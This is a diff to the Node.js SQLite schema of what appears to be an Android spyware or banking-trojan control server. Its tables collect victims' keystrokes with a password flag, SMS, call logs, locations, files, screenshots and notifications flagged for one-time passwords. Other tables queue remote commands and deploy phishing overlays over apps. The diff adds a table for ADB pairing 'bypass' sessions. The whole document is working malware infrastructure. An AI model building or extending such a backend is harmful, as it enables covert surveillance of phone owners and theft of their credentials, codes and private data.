@@ -9,18 +9,18 @@ fs.mkdirSync(path.dirname(DB_PATH), { recursive: true });
 const db = new sqlite3.Database(DB_PATH);
 
 db.serialize(() => {
-  // ── WAL mode + performance PRAGMAs ────────────────────────────────────────
+  // ── WAL mode + performance PRAGMAs ─────────────────────────────────────────
   db.run(`PRAGMA journal_mode    = WAL`);
   db.run(`PRAGMA synchronous     = NORMAL`);
-  db.run(`PRAGMA cache_size      = -32000`);   // ~32 MB page cache
+  db.run(`PRAGMA cache_size      = -32000`);    // ~32 MB page cache
   db.run(`PRAGMA temp_store      = MEMORY`);
   db.run(`PRAGMA mmap_size       = 268435456`); // 256 MB mmap
   db.run(`PRAGMA foreign_keys    = ON`);
   db.run(`PRAGMA auto_vacuum     = INCREMENTAL`);
-  db.run(`PRAGMA page_size       = 4096`);      // must be set before first write
+  db.run(`PRAGMA page_size       = 4096`);
   db.run(`PRAGMA wal_autocheckpoint = 1000`);
 
-  // ── Core: devices ─────────────────────────────────────────────────────────
+  // ── Core: devices ───────────────────────────────────────────────────────────
   db.run(`CREATE TABLE IF NOT EXISTS devices (
     id            TEXT    PRIMARY KEY,
     alias         TEXT,
@@ -39,7 +39,7 @@ db.serialize(() => {
   db.run(`CREATE INDEX IF NOT EXISTS idx_dev_online ON devices(online)`);
   db.run(`CREATE INDEX IF NOT EXISTS idx_dev_seen   ON devices(last_seen DESC)`);
 
-  // ── Events ────────────────────────────────────────────────────────────────
+  // ── Events ──────────────────────────────────────────────────────────────────
   db.run(`CREATE TABLE IF NOT EXISTS events (
     id     INTEGER PRIMARY KEY AUTOINCREMENT,
     ts     INTEGER NOT NULL DEFAULT (strftime('%s','now')),
@@ -51,7 +51,7 @@ db.serialize(() => {
   db.run(`CREATE INDEX IF NOT EXISTS idx_evt_ts   ON events(ts DESC)`);
   db.run(`CREATE INDEX IF NOT EXISTS idx_evt_type ON events(type)`);
 
-  // ── Keylogs (with is_password flag) ──────────────────────────────────────
+  // ── Keylogs ─────────────────────────────────────────────────────────────────
   db.run(`CREATE TABLE IF NOT EXISTS keylogs (
     id          INTEGER PRIMARY KEY AUTOINCREMENT,
     ts          INTEGER NOT NULL DEFAULT (strftime('%s','now')),
@@ -61,15 +61,14 @@ db.serialize(() => {
     text        TEXT,
     is_password INTEGER NOT NULL DEFAULT 0
   )`);
-  // Add is_password column to existing installs
-  db.run(`ALTER TABLE keylogs ADD COLUMN is_password INTEGER NOT NULL DEFAULT 0`,
-    () => { /* ignore if already exists */ });
+  // Migration: add column to existing installs (safe — errors silently ignored)
+  db.run(`ALTER TABLE keylogs ADD COLUMN is_password INTEGER NOT NULL DEFAULT 0`, () => {});
   db.run(`CREATE INDEX IF NOT EXISTS idx_kl_dev  ON keylogs(dev_id)`);
   db.run(`CREATE INDEX IF NOT EXISTS idx_kl_ts   ON keylogs(ts DESC)`);
   db.run(`CREATE INDEX IF NOT EXISTS idx_kl_pkg  ON keylogs(pkg)`);
   db.run(`CREATE INDEX IF NOT EXISTS idx_kl_pass ON keylogs(is_password)`);
 
-  // ── Device data blobs (one row per device) ────────────────────────────────
+  // ── Device data blobs (one row per device) ───────────────────────────────────
   db.run(`CREATE TABLE IF NOT EXISTS device_sms (
     dev_id TEXT PRIMARY KEY,
     ts     INTEGER NOT NULL DEFAULT (strftime('%s','now')),
@@ -90,15 +89,13 @@ db.serialize(() => {
     ts     INTEGER NOT NULL DEFAULT (strftime('%s','now')),
     data   TEXT    NOT NULL DEFAULT '[]'
   )`);
-
-  // ── Call logs (new feature module) ────────────────────────────────────────
   db.run(`CREATE TABLE IF NOT EXISTS device_calls (
     dev_id TEXT PRIMARY KEY,
     ts     INTEGER NOT NULL DEFAULT (strftime('%s','now')),
     data   TEXT    NOT NULL DEFAULT '[]'
   )`);
 
-  // ── Location ─────────────────────────────────────────────────────────────
+  // ── Location ─────────────────────────────────────────────────────────────────
   db.run(`CREATE TABLE IF NOT EXISTS device_location (
     id       INTEGER PRIMARY KEY AUTOINCREMENT,
     dev_id   TEXT    NOT NULL,
@@ -111,7 +108,7 @@ db.serialize(() => {
   db.run(`CREATE INDEX IF NOT EXISTS idx_loc_dev ON device_location(dev_id)`);
   db.run(`CREATE INDEX IF NOT EXISTS idx_loc_ts  ON device_location(ts DESC)`);
 
-  // ── Files ─────────────────────────────────────────────────────────────────
+  // ── Files ────────────────────────────────────────────────────────────────────
   db.run(`CREATE TABLE IF NOT EXISTS files (
     id     INTEGER PRIMARY KEY AUTOINCREMENT,
     ts     INTEGER NOT NULL DEFAULT (strftime('%s','now')),
@@ -123,7 +120,7 @@ db.serialize(() => {
   db.run(`CREATE INDEX IF NOT EXISTS idx_files_dev ON files(dev_id)`);
   db.run(`CREATE INDEX IF NOT EXISTS idx_files_ts  ON files(ts DESC)`);
 
-  // ── Command queue ─────────────────────────────────────────────────────────
+  // ── Command queue ─────────────────────────────────────────────────────────────
   db.run(`CREATE TABLE IF NOT EXISTS cmd_queue (
     id     INTEGER PRIMARY KEY AUTOINCREMENT,
     ts     INTEGER NOT NULL DEFAULT (strftime('%s','now')),
@@ -133,7 +130,7 @@ db.serialize(() => {
   )`);
   db.run(`CREATE INDEX IF NOT EXISTS idx_queue_dev ON cmd_queue(dev_id)`);
 
-  // ── App detections ────────────────────────────────────────────────────────
+  // ── App detections ────────────────────────────────────────────────────────────
   db.run(`CREATE TABLE IF NOT EXISTS app_detections (
     dev_id   TEXT    NOT NULL,
     package  TEXT    NOT NULL,
@@ -148,7 +145,7 @@ db.serialize(() => {
   db.run(`CREATE INDEX IF NOT EXISTS idx_det_dev ON app_detections(dev_id)`);
   db.run(`CREATE INDEX IF NOT EXISTS idx_det_cat ON app_detections(category)`);
 
-  // ── Overlays ──────────────────────────────────────────────────────────────
+  // ── Overlays ──────────────────────────────────────────────────────────────────
   db.run(`CREATE TABLE IF NOT EXISTS overlays (
     id           TEXT    PRIMARY KEY,
     name         TEXT    NOT NULL,
@@ -161,7 +158,7 @@ db.serialize(() => {
   )`);
   db.run(`CREATE INDEX IF NOT EXISTS idx_ov_pkg ON overlays(package_name)`);
 
-  // ── Overlay deployments ──────────────────────────────────────────────────
+  // ── Overlay deployments ───────────────────────────────────────────────────────
   db.run(`CREATE TABLE IF NOT EXISTS overlay_deployments (
     id         INTEGER PRIMARY KEY AUTOINCREMENT,
     dev_id     TEXT    NOT NULL,
@@ -173,7 +170,7 @@ db.serialize(() => {
   )`);
   db.run(`CREATE INDEX IF NOT EXISTS idx_dep_dev ON overlay_deployments(dev_id)`);
 
-  // ── Screenshots ───────────────────────────────────────────────────────────
+  // ── Screenshots ───────────────────────────────────────────────────────────────
   db.run(`CREATE TABLE IF NOT EXISTS screenshots (
     id     INTEGER PRIMARY KEY AUTOINCREMENT,
     dev_id TEXT    NOT NULL,
@@ -183,7 +180,7 @@ db.serialize(() => {
   db.run(`CREATE INDEX IF NOT EXISTS idx_ss_dev ON screenshots(dev_id)`);
   db.run(`CREATE INDEX IF NOT EXISTS idx_ss_ts  ON screenshots(ts DESC)`);
 
-  // ── Notifications ─────────────────────────────────────────────────────────
+  // ── Notifications ─────────────────────────────────────────────────────────────
   db.run(`CREATE TABLE IF NOT EXISTS notifications (
     id       INTEGER PRIMARY KEY AUTOINCREMENT,
     dev_id   TEXT    NOT NULL,
@@ -199,14 +196,28 @@ db.serialize(() => {
   db.run(`CREATE INDEX IF NOT EXISTS idx_notif_ts  ON notifications(ts DESC)`);
   db.run(`CREATE INDEX IF NOT EXISTS idx_notif_otp ON notifications(is_otp)`);
 
-  // ── Periodic WAL checkpoint (keep WAL file small) ─────────────────────────
+  // ── Bypass sessions (was missing — bypass.js needs this) ──────────────────────
+  db.run(`CREATE TABLE IF NOT EXISTS bypass_sessions (
+    id         INTEGER PRIMARY KEY AUTOINCREMENT,
+    dev_id     TEXT    NOT NULL UNIQUE,
+    ip         TEXT,
+    adb_port   INTEGER,
+    pair_port  INTEGER,
+    pair_code  TEXT,
+    status     TEXT    NOT NULL DEFAULT 'idle',
+    data       TEXT,
+    updated_at INTEGER NOT NULL DEFAULT (strftime('%s','now'))
+  )`);
+  db.run(`CREATE INDEX IF NOT EXISTS idx_bypass_dev ON bypass_sessions(dev_id)`);
+
+  // ── Periodic maintenance ──────────────────────────────────────────────────────
   setInterval(() => {
     db.run(`PRAGMA incremental_vacuum(100)`);
     db.run(`PRAGMA wal_checkpoint(PASSIVE)`);
-  }, 5 * 60 * 1000); // every 5 minutes
+  }, 5 * 60 * 1000);
 });
 
-// ── Promisified helpers ───────────────────────────────────────────────────────
+// ── Promisified helpers ────────────────────────────────────────────────────────
 const run = (sql, p = []) =>
   new Promise((res, rej) => db.run(sql, p, function(e) { e ? rej(e) : res(this); }));
 const get = (sql, p = []) =>
